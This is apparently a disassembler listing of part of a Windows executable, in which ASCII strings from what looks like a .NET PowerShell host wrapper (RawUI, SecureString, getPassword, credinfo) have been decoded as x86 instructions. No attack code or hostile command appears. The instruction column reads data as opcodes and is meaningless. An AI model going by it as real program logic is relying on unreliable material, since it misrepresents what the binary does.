  407ce5:	00 67 65             	add    %ah,0x65(%edi)
  407ce8:	74 5f                	je     0x407d49
  407cea:	52                   	push   %edx
  407ceb:	61                   	popa
  407cec:	77 55                	ja     0x407d43
  407cee:	49                   	dec    %ecx
  407cef:	00 69 62             	add    %ch,0x62(%ecx)
  407cf2:	5f                   	pop    %edi
  407cf3:	63 61 70             	arpl   %esp,0x70(%ecx)
  407cf6:	74 69                	je     0x407d61
  407cf8:	6f                   	outsl  %ds:(%esi),(%dx)
  407cf9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cfa:	00 69 62             	add    %ch,0x62(%ecx)
  407cfd:	5f                   	pop    %edi
  407cfe:	6d                   	insl   (%dx),%es:(%edi)
  407cff:	65 73 73             	gs jae 0x407d75
  407d02:	61                   	popa
  407d03:	67 65 00 52 65       	add    %dl,%gs:0x65(%bp,%si)
  407d08:	61                   	popa
  407d09:	64 4c                	fs dec %esp
  407d0b:	69 6e 65 00 53 79 73 	imul   $0x73795300,0x65(%esi),%ebp
  407d12:	74 65                	je     0x407d79
  407d14:	6d                   	insl   (%dx),%es:(%edi)
  407d15:	2e 53                	cs push %ebx
  407d17:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407d1b:	69 74 79 00 53 65 63 	imul   $0x75636553,0x0(%ecx,%edi,2),%esi
  407d22:	75 
  407d23:	72 65                	jb     0x407d8a
  407d25:	53                   	push   %ebx
  407d26:	74 72                	je     0x407d9a
  407d28:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  407d2f:	50                   	push   %eax
  407d30:	61                   	popa
  407d31:	73 73                	jae    0x407da6
  407d33:	77 6f                	ja     0x407da4
  407d35:	72 64                	jb     0x407d9b
  407d37:	00 52 65             	add    %dl,0x65(%edx)
  407d3a:	61                   	popa
  407d3b:	64 4c                	fs dec %esp
  407d3d:	69 6e 65 41 73 53 65 	imul   $0x65537341,0x65(%esi),%ebp
  407d44:	63 75 72             	arpl   %esi,0x72(%ebp)
  407d47:	65 53                	gs push %ebx
  407d49:	74 72                	je     0x407dbd
  407d4b:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  407d52:	74 65                	je     0x407db9
  407d54:	00 57 72             	add    %dl,0x72(%edi)
  407d57:	69 74 65 44 65 62 75 	imul   $0x67756265,0x44(%ebp,%eiz,2),%esi
  407d5e:	67 
  407d5f:	4c                   	dec    %esp
  407d60:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407d67:	74 65                	je     0x407dce
  407d69:	45                   	inc    %ebp
  407d6a:	72 72                	jb     0x407dde
  407d6c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d6d:	72 4c                	jb     0x407dbb
  407d6f:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407d76:	74 65                	je     0x407ddd
  407d78:	4c                   	dec    %esp
  407d79:	69 6e 65 00 70 66 00 	imul   $0x667000,0x65(%esi),%ebp
  407d80:	57                   	push   %edi
  407d81:	72 69                	jb     0x407dec
  407d83:	74 65                	je     0x407dea
  407d85:	50                   	push   %eax
  407d86:	72 6f                	jb     0x407df7
  407d88:	67 72 65             	addr16 jb 0x407df0
  407d8b:	73 73                	jae    0x407e00
  407d8d:	00 57 72             	add    %dl,0x72(%edi)
  407d90:	69 74 65 56 65 72 62 	imul   $0x6f627265,0x56(%ebp,%eiz,2),%esi
  407d97:	6f 
  407d98:	73 65                	jae    0x407dff
  407d9a:	4c                   	dec    %esp
  407d9b:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407da2:	74 65                	je     0x407e09
  407da4:	57                   	push   %edi
  407da5:	61                   	popa
  407da6:	72 6e                	jb     0x407e16
  407da8:	69 6e 67 4c 69 6e 65 	imul   $0x656e694c,0x67(%esi),%ebp
  407daf:	00 52 61             	add    %dl,0x61(%edx)
  407db2:	77 55                	ja     0x407e09
  407db4:	49                   	dec    %ecx
  407db5:	00 70 61             	add    %dh,0x61(%eax)
  407db8:	72 65                	jb     0x407e1f
  407dba:	6e                   	outsb  %ds:(%esi),(%dx)
  407dbb:	74 00                	je     0x407dbd
  407dbd:	75 69                	jne    0x407e28
  407dbf:	00 53 79             	add    %dl,0x79(%ebx)
  407dc2:	73 74                	jae    0x407e38
  407dc4:	65 6d                	gs insl (%dx),%es:(%edi)
  407dc6:	2e 47                	cs inc %edi
  407dc8:	6c                   	insb   (%dx),%es:(%edi)
  407dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  407dca:	62 61 6c             	bound  %esp,0x6c(%ecx)
  407dcd:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  407dd4:	00 43 75             	add    %al,0x75(%ebx)
  407dd7:	6c                   	insb   (%dx),%es:(%edi)
  407dd8:	74 75                	je     0x407e4f
  407dda:	72 65                	jb     0x407e41
  407ddc:	49                   	dec    %ecx
  407ddd:	6e                   	outsb  %ds:(%esi),(%dx)
  407dde:	66 6f                	outsw  %ds:(%esi),(%dx)
  407de0:	00 6f 72             	add    %ch,0x72(%edi)
  407de3:	69 67 69 6e 61 6c 43 	imul   $0x436c616e,0x69(%edi),%esp
  407dea:	75 6c                	jne    0x407e58
  407dec:	74 75                	je     0x407e63
  407dee:	72 65                	jb     0x407e55
  407df0:	49                   	dec    %ecx
  407df1:	6e                   	outsb  %ds:(%esi),(%dx)
  407df2:	66 6f                	outsw  %ds:(%esi),(%dx)
  407df4:	00 6f 72             	add    %ch,0x72(%edi)
  407df7:	69 67 69 6e 61 6c 55 	imul   $0x556c616e,0x69(%edi),%esp
  407dfe:	49                   	dec    %ecx
  407dff:	43                   	inc    %ebx
  407e00:	75 6c                	jne    0x407e6e
  407e02:	74 75                	je     0x407e79
  407e04:	72 65                	jb     0x407e6b
  407e06:	49                   	dec    %ecx
  407e07:	6e                   	outsb  %ds:(%esi),(%dx)
  407e08:	66 6f                	outsw  %ds:(%esi),(%dx)
  407e0a:	00 47 75             	add    %al,0x75(%edi)
  407e0d:	69 64 00 6d 79 49 64 	imul   $0x644979,0x6d(%eax,%eax,1),%esp
  407e14:	00 
  407e15:	67 65 74 5f          	addr16 gs je 0x407e78
  407e19:	50                   	push   %eax
  407e1a:	72 69                	jb     0x407e85
  407e1c:	76 61                	jbe    0x407e7f
  407e1e:	74 65                	je     0x407e85
  407e20:	44                   	inc    %esp
  407e21:	61                   	popa
  407e22:	74 61                	je     0x407e85
  407e24:	00 5f 63             	add    %bl,0x63(%edi)
  407e27:	6f                   	outsl  %ds:(%esi),(%dx)
  407e28:	6e                   	outsb  %ds:(%esi),(%dx)
  407e29:	73 6f                	jae    0x407e9a
  407e2b:	6c                   	insb   (%dx),%es:(%edi)
  407e2c:	65 43                	gs inc %ebx
  407e2e:	6f                   	outsl  %ds:(%esi),(%dx)
  407e2f:	6c                   	insb   (%dx),%es:(%edi)
  407e30:	6f                   	outsl  %ds:(%esi),(%dx)
  407e31:	72 50                	jb     0x407e83
  407e33:	72 6f                	jb     0x407ea4
  407e35:	78 79                	js     0x407eb0
  407e37:	00 67 65             	add    %ah,0x65(%edi)
  407e3a:	74 5f                	je     0x407e9b
  407e3c:	43                   	inc    %ebx
  407e3d:	75 72                	jne    0x407eb1
  407e3f:	72 65                	jb     0x407ea6
  407e41:	6e                   	outsb  %ds:(%esi),(%dx)
  407e42:	74 43                	je     0x407e87
  407e44:	75 6c                	jne    0x407eb2
  407e46:	74 75                	je     0x407ebd
  407e48:	72 65                	jb     0x407eaf
  407e4a:	00 67 65             	add    %ah,0x65(%edi)
  407e4d:	74 5f                	je     0x407eae
  407e4f:	43                   	inc    %ebx
  407e50:	75 72                	jne    0x407ec4
  407e52:	72 65                	jb     0x407eb9
  407e54:	6e                   	outsb  %ds:(%esi),(%dx)
  407e55:	74 55                	je     0x407eac
  407e57:	49                   	dec    %ecx
  407e58:	43                   	inc    %ebx
  407e59:	75 6c                	jne    0x407ec7
  407e5b:	74 75                	je     0x407ed2
  407e5d:	72 65                	jb     0x407ec4
  407e5f:	00 67 65             	add    %ah,0x65(%edi)
  407e62:	74 5f                	je     0x407ec3
  407e64:	49                   	dec    %ecx
  407e65:	6e                   	outsb  %ds:(%esi),(%dx)
  407e66:	73 74                	jae    0x407edc
  407e68:	61                   	popa
  407e69:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6a:	63 65 49             	arpl   %esp,0x49(%ebp)
  407e6d:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407e71:	74 5f                	je     0x407ed2
  407e73:	4e                   	dec    %esi
  407e74:	61                   	popa
  407e75:	6d                   	insl   (%dx),%es:(%edi)
  407e76:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407e7a:	74 5f                	je     0x407edb
  407e7c:	55                   	push   %ebp
  407e7d:	49                   	dec    %ecx
  407e7e:	00 56 65             	add    %dl,0x65(%esi)
  407e81:	72 73                	jb     0x407ef6
  407e83:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  407e8a:	5f                   	pop    %edi
  407e8b:	56                   	push   %esi
  407e8c:	65 72 73             	gs jb  0x407f02
  407e8f:	69 6f 6e 00 45 6e 74 	imul   $0x746e4500,0x6e(%edi),%ebp
  407e96:	65 72 4e             	gs jb  0x407ee7
  407e99:	65 73 74             	gs jae 0x407f10
  407e9c:	65 64 50             	gs fs push %eax
  407e9f:	72 6f                	jb     0x407f10
  407ea1:	6d                   	insl   (%dx),%es:(%edi)
  407ea2:	70 74                	jo     0x407f18
  407ea4:	00 45 78             	add    %al,0x78(%ebp)
  407ea7:	69 74 4e 65 73 74 65 	imul   $0x64657473,0x65(%esi,%ecx,2),%esi
  407eae:	64 
  407eaf:	50                   	push   %eax
  407eb0:	72 6f                	jb     0x407f21
  407eb2:	6d                   	insl   (%dx),%es:(%edi)
  407eb3:	70 74                	jo     0x407f29
  407eb5:	00 4e 6f             	add    %cl,0x6f(%esi)
  407eb8:	74 69                	je     0x407f23
  407eba:	66 79 42             	data16 jns 0x407eff
  407ebd:	65 67 69 6e 41 70 70 	imul   $0x696c7070,%gs:0x41(%bp),%ebp
  407ec4:	6c 69 
  407ec6:	63 61 74             	arpl   %esp,0x74(%ecx)
  407ec9:	69 6f 6e 00 4e 6f 74 	imul   $0x746f4e00,0x6e(%edi),%ebp
  407ed0:	69 66 79 45 6e 64 41 	imul   $0x41646e45,0x79(%esi),%esp
  407ed7:	70 70                	jo     0x407f49
  407ed9:	6c                   	insb   (%dx),%es:(%edi)
  407eda:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407ee1:	00 53 65             	add    %dl,0x65(%ebx)
  407ee4:	74 53                	je     0x407f39
  407ee6:	68 6f 75 6c 64       	push   $0x646c756f
  407eeb:	45                   	inc    %ebp
  407eec:	78 69                	js     0x407f57
  407eee:	74 00                	je     0x407ef0
  407ef0:	50                   	push   %eax
  407ef1:	72 69                	jb     0x407f5c
  407ef3:	76 61                	jbe    0x407f56
  407ef5:	74 65                	je     0x407f5c
  407ef7:	44                   	inc    %esp
  407ef8:	61                   	popa
  407ef9:	74 61                	je     0x407f5c
  407efb:	00 43 75             	add    %al,0x75(%ebx)
  407efe:	72 72                	jb     0x407f72
  407f00:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f02:	74 43                	je     0x407f47
  407f04:	75 6c                	jne    0x407f72
  407f06:	74 75                	je     0x407f7d
  407f08:	72 65                	jb     0x407f6f
  407f0a:	00 43 75             	add    %al,0x75(%ebx)
  407f0d:	72 72                	jb     0x407f81
  407f0f:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f11:	74 55                	je     0x407f68
  407f13:	49                   	dec    %ecx
  407f14:	43                   	inc    %ebx
  407f15:	75 6c                	jne    0x407f83
  407f17:	74 75                	je     0x407f8e
  407f19:	72 65                	jb     0x407f80
  407f1b:	00 49 6e             	add    %cl,0x6e(%ecx)
  407f1e:	73 74                	jae    0x407f94
  407f20:	61                   	popa
  407f21:	6e                   	outsb  %ds:(%esi),(%dx)
  407f22:	63 65 49             	arpl   %esp,0x49(%ebp)
  407f25:	64 00 4e 61          	add    %cl,%fs:0x61(%esi)
  407f29:	6d                   	insl   (%dx),%es:(%edi)
  407f2a:	65 00 55 49          	add    %dl,%gs:0x49(%ebp)
  407f2e:	00 5f 75             	add    %bl,0x75(%edi)
  407f31:	69 00 67 65 74 5f    	imul   $0x5f746567,(%eax),%eax
  407f37:	45                   	inc    %ebp
  407f38:	72 72                	jb     0x407fac
  407f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  407f3b:	72 46                	jb     0x407f83
  407f3d:	6f                   	outsl  %ds:(%esi),(%dx)
  407f3e:	72 65                	jb     0x407fa5
  407f40:	67 72 6f             	addr16 jb 0x407fb2
  407f43:	75 6e                	jne    0x407fb3
  407f45:	64 43                	fs inc %ebx
  407f47:	6f                   	outsl  %ds:(%esi),(%dx)
  407f48:	6c                   	insb   (%dx),%es:(%edi)
  407f49:	6f                   	outsl  %ds:(%esi),(%dx)
  407f4a:	72 00                	jb     0x407f4c
  407f4c:	73 65                	jae    0x407fb3
  407f4e:	74 5f                	je     0x407faf
  407f50:	45                   	inc    %ebp
  407f51:	72 72                	jb     0x407fc5
  407f53:	6f                   	outsl  %ds:(%esi),(%dx)
  407f54:	72 46                	jb     0x407f9c
  407f56:	6f                   	outsl  %ds:(%esi),(%dx)
  407f57:	72 65                	jb     0x407fbe
  407f59:	67 72 6f             	addr16 jb 0x407fcb
  407f5c:	75 6e                	jne    0x407fcc
  407f5e:	64 43                	fs inc %ebx
  407f60:	6f                   	outsl  %ds:(%esi),(%dx)
  407f61:	6c                   	insb   (%dx),%es:(%edi)
  407f62:	6f                   	outsl  %ds:(%esi),(%dx)
  407f63:	72 00                	jb     0x407f65
  407f65:	67 65 74 5f          	addr16 gs je 0x407fc8
  407f69:	45                   	inc    %ebp
  407f6a:	72 72                	jb     0x407fde
  407f6c:	6f                   	outsl  %ds:(%esi),(%dx)
  407f6d:	72 42                	jb     0x407fb1
  407f6f:	61                   	popa
  407f70:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407f73:	72 6f                	jb     0x407fe4
  407f75:	75 6e                	jne    0x407fe5
  407f77:	64 43                	fs inc %ebx
  407f79:	6f                   	outsl  %ds:(%esi),(%dx)
  407f7a:	6c                   	insb   (%dx),%es:(%edi)
  407f7b:	6f                   	outsl  %ds:(%esi),(%dx)
  407f7c:	72 00                	jb     0x407f7e
  407f7e:	73 65                	jae    0x407fe5
  407f80:	74 5f                	je     0x407fe1
  407f82:	45                   	inc    %ebp
  407f83:	72 72                	jb     0x407ff7
  407f85:	6f                   	outsl  %ds:(%esi),(%dx)
  407f86:	72 42                	jb     0x407fca
  407f88:	61                   	popa
  407f89:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407f8c:	72 6f                	jb     0x407ffd
  407f8e:	75 6e                	jne    0x407ffe
  407f90:	64 43                	fs inc %ebx
  407f92:	6f                   	outsl  %ds:(%esi),(%dx)
  407f93:	6c                   	insb   (%dx),%es:(%edi)
  407f94:	6f                   	outsl  %ds:(%esi),(%dx)
  407f95:	72 00                	jb     0x407f97
  407f97:	67 65 74 5f          	addr16 gs je 0x407ffa
  407f9b:	57                   	push   %edi
  407f9c:	61                   	popa
  407f9d:	72 6e                	jb     0x40800d
  407f9f:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  407fa6:	67 72 6f             	addr16 jb 0x408018
  407fa9:	75 6e                	jne    0x408019
  407fab:	64 43                	fs inc %ebx
  407fad:	6f                   	outsl  %ds:(%esi),(%dx)
  407fae:	6c                   	insb   (%dx),%es:(%edi)
  407faf:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb0:	72 00                	jb     0x407fb2
  407fb2:	73 65                	jae    0x408019
  407fb4:	74 5f                	je     0x408015
  407fb6:	57                   	push   %edi
  407fb7:	61                   	popa
  407fb8:	72 6e                	jb     0x408028
  407fba:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  407fc1:	67 72 6f             	addr16 jb 0x408033
  407fc4:	75 6e                	jne    0x408034
  407fc6:	64 43                	fs inc %ebx
  407fc8:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc9:	6c                   	insb   (%dx),%es:(%edi)
  407fca:	6f                   	outsl  %ds:(%esi),(%dx)
  407fcb:	72 00                	jb     0x407fcd
  407fcd:	67 65 74 5f          	addr16 gs je 0x408030
  407fd1:	57                   	push   %edi
  407fd2:	61                   	popa
  407fd3:	72 6e                	jb     0x408043
  407fd5:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407fdc:	67 72 6f             	addr16 jb 0x40804e
  407fdf:	75 6e                	jne    0x40804f
  407fe1:	64 43                	fs inc %ebx
  407fe3:	6f                   	outsl  %ds:(%esi),(%dx)
  407fe4:	6c                   	insb   (%dx),%es:(%edi)
  407fe5:	6f                   	outsl  %ds:(%esi),(%dx)
  407fe6:	72 00                	jb     0x407fe8
  407fe8:	73 65                	jae    0x40804f
  407fea:	74 5f                	je     0x40804b
  407fec:	57                   	push   %edi
  407fed:	61                   	popa
  407fee:	72 6e                	jb     0x40805e
  407ff0:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407ff7:	67 72 6f             	addr16 jb 0x408069
  407ffa:	75 6e                	jne    0x40806a
  407ffc:	64 43                	fs inc %ebx
  407ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  407fff:	6c                   	insb   (%dx),%es:(%edi)
  408000:	6f                   	outsl  %ds:(%esi),(%dx)
  408001:	72 00                	jb     0x408003
  408003:	67 65 74 5f          	addr16 gs je 0x408066
  408007:	44                   	inc    %esp
  408008:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40800c:	46                   	inc    %esi
  40800d:	6f                   	outsl  %ds:(%esi),(%dx)
  40800e:	72 65                	jb     0x408075
  408010:	67 72 6f             	addr16 jb 0x408082
  408013:	75 6e                	jne    0x408083
  408015:	64 43                	fs inc %ebx
  408017:	6f                   	outsl  %ds:(%esi),(%dx)
  408018:	6c                   	insb   (%dx),%es:(%edi)
  408019:	6f                   	outsl  %ds:(%esi),(%dx)
  40801a:	72 00                	jb     0x40801c
  40801c:	73 65                	jae    0x408083
  40801e:	74 5f                	je     0x40807f
  408020:	44                   	inc    %esp
  408021:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408025:	46                   	inc    %esi
  408026:	6f                   	outsl  %ds:(%esi),(%dx)
  408027:	72 65                	jb     0x40808e
  408029:	67 72 6f             	addr16 jb 0x40809b
  40802c:	75 6e                	jne    0x40809c
  40802e:	64 43                	fs inc %ebx
  408030:	6f                   	outsl  %ds:(%esi),(%dx)
  408031:	6c                   	insb   (%dx),%es:(%edi)
  408032:	6f                   	outsl  %ds:(%esi),(%dx)
  408033:	72 00                	jb     0x408035
  408035:	67 65 74 5f          	addr16 gs je 0x408098
  408039:	44                   	inc    %esp
  40803a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40803e:	42                   	inc    %edx
  40803f:	61                   	popa
  408040:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  408043:	72 6f                	jb     0x4080b4
  408045:	75 6e                	jne    0x4080b5
  408047:	64 43                	fs inc %ebx
  408049:	6f                   	outsl  %ds:(%esi),(%dx)
  40804a:	6c                   	insb   (%dx),%es:(%edi)
  40804b:	6f                   	outsl  %ds:(%esi),(%dx)
  40804c:	72 00                	jb     0x40804e
  40804e:	73 65                	jae    0x4080b5
  408050:	74 5f                	je     0x4080b1
  408052:	44                   	inc    %esp
  408053:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408057:	42                   	inc    %edx
  408058:	61                   	popa
  408059:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40805c:	72 6f                	jb     0x4080cd
  40805e:	75 6e                	jne    0x4080ce
  408060:	64 43                	fs inc %ebx
  408062:	6f                   	outsl  %ds:(%esi),(%dx)
  408063:	6c                   	insb   (%dx),%es:(%edi)
  408064:	6f                   	outsl  %ds:(%esi),(%dx)
  408065:	72 00                	jb     0x408067
  408067:	67 65 74 5f          	addr16 gs je 0x4080ca
  40806b:	56                   	push   %esi
  40806c:	65 72 62             	gs jb  0x4080d1
  40806f:	6f                   	outsl  %ds:(%esi),(%dx)
  408070:	73 65                	jae    0x4080d7
  408072:	46                   	inc    %esi
  408073:	6f                   	outsl  %ds:(%esi),(%dx)
  408074:	72 65                	jb     0x4080db
  408076:	67 72 6f             	addr16 jb 0x4080e8
  408079:	75 6e                	jne    0x4080e9
  40807b:	64 43                	fs inc %ebx
  40807d:	6f                   	outsl  %ds:(%esi),(%dx)
  40807e:	6c                   	insb   (%dx),%es:(%edi)
  40807f:	6f                   	outsl  %ds:(%esi),(%dx)
  408080:	72 00                	jb     0x408082
  408082:	73 65                	jae    0x4080e9
  408084:	74 5f                	je     0x4080e5
  408086:	56                   	push   %esi
  408087:	65 72 62             	gs jb  0x4080ec
  40808a:	6f                   	outsl  %ds:(%esi),(%dx)
  40808b:	73 65                	jae    0x4080f2
  40808d:	46                   	inc    %esi
  40808e:	6f                   	outsl  %ds:(%esi),(%dx)
  40808f:	72 65                	jb     0x4080f6
  408091:	67 72 6f             	addr16 jb 0x408103
  408094:	75 6e                	jne    0x408104
  408096:	64 43                	fs inc %ebx
  408098:	6f                   	outsl  %ds:(%esi),(%dx)
  408099:	6c                   	insb   (%dx),%es:(%edi)
  40809a:	6f                   	outsl  %ds:(%esi),(%dx)
  40809b:	72 00                	jb     0x40809d
  40809d:	67 65 74 5f          	addr16 gs je 0x408100
  4080a1:	56                   	push   %esi
  4080a2:	65 72 62             	gs jb  0x408107
  4080a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4080a6:	73 65                	jae    0x40810d
  4080a8:	42                   	inc    %edx
  4080a9:	61                   	popa
  4080aa:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4080ad:	72 6f                	jb     0x40811e
  4080af:	75 6e                	jne    0x40811f
  4080b1:	64 43                	fs inc %ebx
  4080b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4080b4:	6c                   	insb   (%dx),%es:(%edi)
  4080b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4080b6:	72 00                	jb     0x4080b8
  4080b8:	73 65                	jae    0x40811f
  4080ba:	74 5f                	je     0x40811b
  4080bc:	56                   	push   %esi
  4080bd:	65 72 62             	gs jb  0x408122
  4080c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4080c1:	73 65                	jae    0x408128
  4080c3:	42                   	inc    %edx
  4080c4:	61                   	popa
  4080c5:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4080c8:	72 6f                	jb     0x408139
  4080ca:	75 6e                	jne    0x40813a
  4080cc:	64 43                	fs inc %ebx
  4080ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4080cf:	6c                   	insb   (%dx),%es:(%edi)
  4080d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4080d1:	72 00                	jb     0x4080d3
  4080d3:	67 65 74 5f          	addr16 gs je 0x408136
  4080d7:	50                   	push   %eax
  4080d8:	72 6f                	jb     0x408149
  4080da:	67 72 65             	addr16 jb 0x408142
  4080dd:	73 73                	jae    0x408152
  4080df:	46                   	inc    %esi
  4080e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4080e1:	72 65                	jb     0x408148
  4080e3:	67 72 6f             	addr16 jb 0x408155
  4080e6:	75 6e                	jne    0x408156
  4080e8:	64 43                	fs inc %ebx
  4080ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4080eb:	6c                   	insb   (%dx),%es:(%edi)
  4080ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4080ed:	72 00                	jb     0x4080ef
  4080ef:	73 65                	jae    0x408156
  4080f1:	74 5f                	je     0x408152
  4080f3:	50                   	push   %eax
  4080f4:	72 6f                	jb     0x408165
  4080f6:	67 72 65             	addr16 jb 0x40815e
  4080f9:	73 73                	jae    0x40816e
  4080fb:	46                   	inc    %esi
  4080fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4080fd:	72 65                	jb     0x408164
  4080ff:	67 72 6f             	addr16 jb 0x408171
  408102:	75 6e                	jne    0x408172
  408104:	64 43                	fs inc %ebx
  408106:	6f                   	outsl  %ds:(%esi),(%dx)
  408107:	6c                   	insb   (%dx),%es:(%edi)
  408108:	6f                   	outsl  %ds:(%esi),(%dx)
  408109:	72 00                	jb     0x40810b
  40810b:	67 65 74 5f          	addr16 gs je 0x40816e
  40810f:	50                   	push   %eax
  408110:	72 6f                	jb     0x408181
  408112:	67 72 65             	addr16 jb 0x40817a
  408115:	73 73                	jae    0x40818a
  408117:	42                   	inc    %edx
  408118:	61                   	popa
  408119:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40811c:	72 6f                	jb     0x40818d
  40811e:	75 6e                	jne    0x40818e
  408120:	64 43                	fs inc %ebx
  408122:	6f                   	outsl  %ds:(%esi),(%dx)
  408123:	6c                   	insb   (%dx),%es:(%edi)
  408124:	6f                   	outsl  %ds:(%esi),(%dx)
  408125:	72 00                	jb     0x408127
  408127:	73 65                	jae    0x40818e
  408129:	74 5f                	je     0x40818a
  40812b:	50                   	push   %eax
  40812c:	72 6f                	jb     0x40819d
  40812e:	67 72 65             	addr16 jb 0x408196
  408131:	73 73                	jae    0x4081a6
  408133:	42                   	inc    %edx
  408134:	61                   	popa
  408135:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  408138:	72 6f                	jb     0x4081a9
  40813a:	75 6e                	jne    0x4081aa
  40813c:	64 43                	fs inc %ebx
  40813e:	6f                   	outsl  %ds:(%esi),(%dx)
  40813f:	6c                   	insb   (%dx),%es:(%edi)
  408140:	6f                   	outsl  %ds:(%esi),(%dx)
  408141:	72 00                	jb     0x408143
  408143:	67 65 74 5f          	addr16 gs je 0x4081a6
  408147:	53                   	push   %ebx
  408148:	68 6f 75 6c 64       	push   $0x646c756f
  40814d:	45                   	inc    %ebp
  40814e:	78 69                	js     0x4081b9
  408150:	74 00                	je     0x408152
  408152:	73 65                	jae    0x4081b9
  408154:	74 5f                	je     0x4081b5
  408156:	53                   	push   %ebx
  408157:	68 6f 75 6c 64       	push   $0x646c756f
  40815c:	45                   	inc    %ebp
  40815d:	78 69                	js     0x4081c8
  40815f:	74 00                	je     0x408161
  408161:	67 65 74 5f          	addr16 gs je 0x4081c4
  408165:	45                   	inc    %ebp
  408166:	78 69                	js     0x4081d1
  408168:	74 43                	je     0x4081ad
  40816a:	6f                   	outsl  %ds:(%esi),(%dx)
  40816b:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  408170:	74 5f                	je     0x4081d1
  408172:	45                   	inc    %ebp
  408173:	78 69                	js     0x4081de
  408175:	74 43                	je     0x4081ba
  408177:	6f                   	outsl  %ds:(%esi),(%dx)
  408178:	64 65 00 53 68       	fs add %dl,%gs:0x68(%ebx)
  40817d:	6f                   	outsl  %ds:(%esi),(%dx)
  40817e:	75 6c                	jne    0x4081ec
  408180:	64 45                	fs inc %ebp
  408182:	78 69                	js     0x4081ed
  408184:	74 00                	je     0x408186
  408186:	45                   	inc    %ebp
  408187:	78 69                	js     0x4081f2
  408189:	74 43                	je     0x4081ce
  40818b:	6f                   	outsl  %ds:(%esi),(%dx)
  40818c:	64 65 00 73 68       	fs add %dh,%gs:0x68(%ebx)
  408191:	6f                   	outsl  %ds:(%esi),(%dx)
  408192:	75 6c                	jne    0x408200
  408194:	64 45                	fs inc %ebp
  408196:	78 69                	js     0x408201
  408198:	74 00                	je     0x40819a
  40819a:	65 78 69             	gs js  0x408206
  40819d:	74 43                	je     0x4081e2
  40819f:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a0:	64 65 00 4d 61       	fs add %cl,%gs:0x61(%ebp)
  4081a5:	69 6e 00 55 6e 68 61 	imul   $0x61686e55,0x0(%esi),%ebp
  4081ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ad:	64 6c                	fs insb (%dx),%es:(%edi)
  4081af:	65 64 45             	gs fs inc %ebp
  4081b2:	78 63                	js     0x408217
  4081b4:	65 70 74             	gs jo  0x40822b
  4081b7:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  4081be:	74 41                	je     0x408201
  4081c0:	72 67                	jb     0x408229
  4081c2:	73 00                	jae    0x4081c4
  4081c4:	43                   	inc    %ebx
  4081c5:	75 72                	jne    0x408239
  4081c7:	72 65                	jb     0x40822e
  4081c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ca:	74 44                	je     0x408210
  4081cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cd:	6d                   	insl   (%dx),%es:(%edi)
  4081ce:	61                   	popa
  4081cf:	69 6e 5f 55 6e 68 61 	imul   $0x61686e55,0x5f(%esi),%ebp
  4081d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4081d7:	64 6c                	fs insb (%dx),%es:(%edi)
  4081d9:	65 64 45             	gs fs inc %ebp
  4081dc:	78 63                	js     0x408241
  4081de:	65 70 74             	gs jo  0x408255
  4081e1:	69 6f 6e 00 63 72 65 	imul   $0x65726300,0x6e(%edi),%ebp
  4081e8:	64 69 6e 66 6f 00 74 	imul   $0x6174006f,%fs:0x66(%esi),%ebp
  4081ef:	61 
  4081f0:	72 67                	jb     0x408259
  4081f2:	65 74 4e             	gs je  0x408243
  4081f5:	61                   	popa
  4081f6:	6d                   	insl   (%dx),%es:(%edi)
  4081f7:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  4081fb:	73 65                	jae    0x408262
